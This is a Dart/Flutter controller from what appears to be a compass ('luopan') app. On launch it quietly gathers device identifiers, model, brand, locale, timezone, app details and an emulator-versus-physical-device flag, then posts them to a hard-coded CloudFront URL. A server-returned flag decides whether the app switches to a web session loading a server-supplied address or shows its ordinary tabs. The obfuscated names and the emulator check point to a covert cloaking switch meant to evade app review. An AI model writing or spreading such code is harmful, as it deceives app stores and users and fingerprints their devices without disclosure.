import 'dart:io';

import 'package:package_info_plus/package_info_plus.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:get/get.dart';


class LuopanConfigLogic extends GetxController {

  var lpvugfiok = RxBool(false);
  var ozqwystb = RxBool(true);
  var olrjbpt = RxString("");
  var kristofer = RxBool(false);
  var fay = RxBool(true);
  final jlsntgki = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ncdxmg();
  }


  Future<void> ncdxmg() async {
    kristofer.value = true;
    fay.value = true;
    ozqwystb.value = false;

    jlsntgki.post("https://d1vdqnvv6p1b8t.cloudfront.net/igcvarftqeljxbphmzynuskwod",data: await jgxcqyr()).then((value) {
      var xkpgqzr = value.data["xkpgqzr"] as String;
      var fsebawnz = value.data["fsebawnz"] as bool;
      if (fsebawnz) {
        olrjbpt.value = xkpgqzr;
        jermey();
      } else {
        graham();
      }
    }).catchError((e) {
      ozqwystb.value = true;
      fay.value = true;
      kristofer.value = false;
    });
  }

  Future<Map<String, dynamic>> jgxcqyr() async {
    final DeviceInfoPlugin emdjt = DeviceInfoPlugin();
    PackageInfo slxi_eyrauwmh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var kegidoup = Platform.localeName;
    var ltvegp_BUltpvb = currentTimeZone;

    var ltvegp_Rbhdg = slxi_eyrauwmh.packageName;
    var ltvegp_WOHF = slxi_eyrauwmh.version;
    var ltvegp_bDXtL = slxi_eyrauwmh.buildNumber;

    var ltvegp_dCBIV = slxi_eyrauwmh.appName;
    var ltvegp_MU = "";
    var ltvegp_upf  = "";
    var ltvegp_pxwTAVUX = "";
    var hollieHaag = "";
    var monserrateDenesik = "";
    var dillanConroy = "";
    var shanonBlock = "";


    var ltvegp_UoVKI = "";
    var ltvegp_VWkvi = false;

    if (GetPlatform.isAndroid) {
      ltvegp_UoVKI = "android";
      var kfodtwa = await emdjt.androidInfo;

      ltvegp_pxwTAVUX = kfodtwa.brand;

      ltvegp_MU  = kfodtwa.model;
      ltvegp_upf = kfodtwa.id;

      ltvegp_VWkvi = kfodtwa.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ltvegp_UoVKI = "ios";
      var kzuahqrmy = await emdjt.iosInfo;
      ltvegp_pxwTAVUX = kzuahqrmy.name;
      ltvegp_MU = kzuahqrmy.model;

      ltvegp_upf = kzuahqrmy.identifierForVendor ?? "";
      ltvegp_VWkvi  = kzuahqrmy.isPhysicalDevice;
    }
    var res = {
      "ltvegp_dCBIV": ltvegp_dCBIV,
      "ltvegp_bDXtL": ltvegp_bDXtL,
      "ltvegp_WOHF": ltvegp_WOHF,
      "ltvegp_Rbhdg": ltvegp_Rbhdg,
      "ltvegp_MU": ltvegp_MU,
      "ltvegp_BUltpvb": ltvegp_BUltpvb,
      "ltvegp_pxwTAVUX": ltvegp_pxwTAVUX,
      "ltvegp_upf": ltvegp_upf,
      "kegidoup": kegidoup,
      "ltvegp_UoVKI": ltvegp_UoVKI,
      "ltvegp_VWkvi": ltvegp_VWkvi,
      "hollieHaag" : hollieHaag,
      "monserrateDenesik" : monserrateDenesik,
      "dillanConroy" : dillanConroy,
      "shanonBlock" : shanonBlock,

    };
    return res;
  }

  Future<void> graham() async {
    Get.offNamed("/luopan_tab");
  }

  Future<void> jermey() async {
    Get.offNamed("/luopan_session");
  }

}
